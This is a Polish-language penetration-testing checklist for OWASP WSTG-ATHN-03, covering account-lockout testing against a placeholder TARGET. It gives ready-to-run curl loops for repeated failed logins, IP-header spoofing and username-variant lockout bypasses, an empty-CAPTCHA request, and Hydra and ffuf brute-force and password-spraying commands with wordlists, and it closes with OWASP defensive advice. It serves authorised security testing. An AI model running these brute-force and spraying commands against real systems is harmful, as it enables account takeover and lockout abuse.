# WSTG-ATHN-03 — Testing for Weak Lock Out Mechanism

## Cele

- Ocenic mechanizm blokady konta przed brute force
- Sprawdzic progi blokady i czas trwania
- Przetestowac mozliwosc obejscia blokady

## KOMENDY

### Test blokady konta - seria blednych logowan

```bash
for i in $(seq 1 15); do echo -n "Proba $i: "; curl -s -o /dev/null -w "%{http_code} (czas: %{time_total}s)" -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"wrong'$i'"}'; echo; done

```

### Test czy po zablokowaniu poprawne haslo tez jest odrzucane

```bash
curl -s -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"CORRECT_PASSWORD"}' -v

```

### Test obejscia blokady przez zmiane IP (X-Forwarded-For)

```bash
for i in $(seq 1 10); do curl -s -o /dev/null -w "IP 10.0.0.$i: %{http_code}\n" -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -H "X-Forwarded-For: 10.0.0.$i" -d '{"username":"admin","password":"wrong"}'; done

```

### Test obejscia przez rozne naglowki IP

```bash
curl -s -X POST "https://TARGET/api/login" -H "X-Forwarded-For: 127.0.0.1" -H "Content-Type: application/json" -d '{"username":"admin","password":"wrong"}' -v
curl -s -X POST "https://TARGET/api/login" -H "X-Real-IP: 127.0.0.1" -H "Content-Type: application/json" -d '{"username":"admin","password":"wrong"}' -v
curl -s -X POST "https://TARGET/api/login" -H "X-Client-IP: 127.0.0.1" -H "Content-Type: application/json" -d '{"username":"admin","password":"wrong"}' -v
curl -s -X POST "https://TARGET/api/login" -H "X-Originating-IP: 127.0.0.1" -H "Content-Type: application/json" -d '{"username":"admin","password":"wrong"}' -v

```

### Test obejscia przez case sensitivity username

```bash
curl -s -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"Admin","password":"wrong"}' -v
curl -s -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"ADMIN","password":"wrong"}' -v
curl -s -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"aDmIn","password":"wrong"}' -v

```

### Test obejscia przez dodanie spacji/znaków

```bash
curl -s -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"admin ","password":"wrong"}' -v
curl -s -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":" admin","password":"wrong"}' -v

```

### Test czasu trwania blokady

```bash
echo "Czekam 5 minut po zablokowaniu..."; sleep 300; curl -s -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"CORRECT_PASSWORD"}' -v

```

### Test blokady na roznych endpointach

```bash
curl -s -X POST "https://TARGET/login" -d "username=admin&password=wrong" -v
curl -s -X POST "https://TARGET/api/v1/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"wrong"}' -v
curl -s -X POST "https://TARGET/api/v2/auth" -H "Content-Type: application/json" -d '{"username":"admin","password":"wrong"}' -v

```

### Test CAPTCHA bypass

```bash
curl -s -X POST "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"wrong","captcha":""}' -v

```

## KOMENDY Z WORDLISTAMI

### Hydra z rate limiting (1 proba na sekunde)

```bash
hydra -l admin -P Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt -t 1 -W 1 TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"

```

### Hydra z popularnymi haslami (test blokady)

```bash
hydra -l admin -P Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/top-passwords-shortlist.txt TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"

```

### ffuf z rate limiting do testowania progu blokady

```bash
ffuf -w Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt:PASS -u "https://TARGET/api/login" -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"PASS"}' -mc 200 -rate 1

```

### Test password spraying (1 haslo na wielu uzytkownikach - ominiecie blokady)

```bash
hydra -L Desktop/WSTG/SecLists-master/Usernames/top-usernames-shortlist.txt -p "Password1!" TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Wyslij 5-10 blednych logowan i sprawdz czy konto zostaje zablokowane
2. Zanotuj dokladny prog blokady (po ilu probach)
3. Sprawdz czas trwania blokady (5 min, 15 min, 30 min, permanentna?)
4. Przetestuj czy blokada dotyczy konta czy adresu IP
5. W Burp Intruder uzyj Pitchfork attack z roznicowanymi X-Forwarded-For
6. Sprawdz czy CAPTCHA pojawia sie po kilku blednych probach
7. Przetestuj password spraying (jedno haslo na wielu uzytkownikach)
8. Sprawdz czy komunikat bledu zmienia sie po zablokowaniu konta


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Authentication_Cheat_Sheet.md

- Implementuj progresywne opoznienia po nieudanych probach logowania
- Zablokuj konto po N nieudanych probach (np. 5-10) z mozliwoscia odblokowania
- Powiadom uzytkownika o zablokowaniu konta (email/SMS)
- Loguj wszystkie nieudane proby logowania z adresem IP i timestampem
- Nie ujawniaj dokladnej liczby pozostalych prob — unikaj information leakage

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.
